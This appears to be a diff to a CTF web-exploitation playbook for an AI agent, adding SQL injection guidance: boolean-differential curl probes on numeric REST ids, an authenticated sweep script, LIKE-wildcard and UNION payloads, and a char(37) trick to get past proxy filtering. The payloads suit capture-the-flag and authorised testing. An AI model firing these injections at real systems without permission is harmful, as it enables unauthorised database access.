@@ -2,12 +2,40 @@
 
 ## C. SQLi — search, filter, login, id params
 
+**Read this before the first probe: a quote only tests a *string* context.** In a numeric
+context — which is what a REST id almost always is — `'` is not a syntax break, it just makes
+the id fail to match. `GET /api/products/1'` answering `{"error":"Product not found"}` is
+*identical* for a bound integer and a concatenated one, so that response tells you **nothing**
+and must never be recorded as "parameterized". Use the boolean differential instead:
+
+```bash
+curl -si "<target>/api/products/1%20AND%201=1" $AUTH_HEADER   # 200, the record
+curl -si "<target>/api/products/1%20AND%201=2" $AUTH_HEADER   # 404 / empty  -> INJECTABLE
+```
+
+Two responses, no ambiguity. On a CafeClub instance this exact pair was the whole solve, and a
+`1'` probe read as "killed" cost ~30 minutes and a full detour through mass assignment, JWT
+forgery, race conditions and a 50k brute force before the user redirected the run.
+
 Quick probe:
 ```bash
 curl -si "<target>/api/search?q=test'" $AUTH_HEADER
 curl -si "<target>/api/search?q=1+OR+1=1--" $AUTH_HEADER
-curl -si "<target>/api/items/1'" $AUTH_HEADER
+curl -si "<target>/api/items/1'" $AUTH_HEADER            # string ctx only — see above
+curl -si "<target>/api/items/1%20AND%201=2" $AUTH_HEADER  # numeric ctx: the one that decides
 ```
+
+**Sweep every `{...}` position rather than picking one.** `ctf-init.sh` runs this pre-auth off
+`recon/methods.txt`; re-run it authenticated, because on a gated API the pre-auth pass reports
+every position `UNTESTED` (not cleared) when the ids 401:
+
+```bash
+python3 ~/.claude/skills/web-ctf/scripts/sqlquick.py --sweep --base <target> \
+  --methods recon/methods.txt --token "$TOKEN" --out recon/sqlisweep_auth
+```
+
+A `LIKE '%..%'` wrapper needs the wildcard closed *and* the tail commented — `Kenya%' --`, not
+`Kenya' --`. Sending the latter and seeing 0 rows looks exactly like a bound parameter.
 
 DB error, changed row count, or changed length → **run `sqlquick.py` before sqlmap.** It's a
 low-volume fast-track for exactly this signal on a single GET parameter: baseline, then a quote,
@@ -24,7 +52,22 @@ python3 ~/.claude/skills/web-ctf/scripts/sqlquick.py --url "<target>/api/search?
 # param is inferred when the URL has exactly one query param; otherwise pass --param
 python3 ~/.claude/skills/web-ctf/scripts/sqlquick.py --url "<target>/api/items?id=1&sort=name" \
   --param id --cookie "session=<value>"
+# a path parameter has no name to pass: --path-param takes the last segment, or mark it with *
+python3 ~/.claude/skills/web-ctf/scripts/sqlquick.py --url "<target>/api/products/1" \
+  --path-param --token "$TOKEN"
+python3 ~/.claude/skills/web-ctf/scripts/sqlquick.py --url "<target>/api/products/*/reviews" \
+  --seed 1 --token "$TOKEN"
 ```
+
+Two things that silently break a path-mode UNION, both handled by the script but worth knowing
+when hand-rolling one:
+
+- **A single-row `/resource/:id` returns the app's row, not yours.** `1 UNION SELECT <payload>`
+  hands back the real product and your row is never rendered. Empty the left side first:
+  `1 AND 1=2 UNION SELECT ...`.
+- **A literal `%` cannot survive a path segment.** URL-encoded as `%25` it is rejected with a
+  `400` by proxies in front of the app, so `NOT LIKE 'sqlite_%'` returns nothing at all and looks
+  like an empty database. Use `'sqlite_'||char(37)` instead.
 
 It's rate-limit aware by default (0.55s between requests, two backoff retries on `429` at ~3s then
 ~6s) and **aborts as inconclusive rather than reporting a negative** if throttling persists past
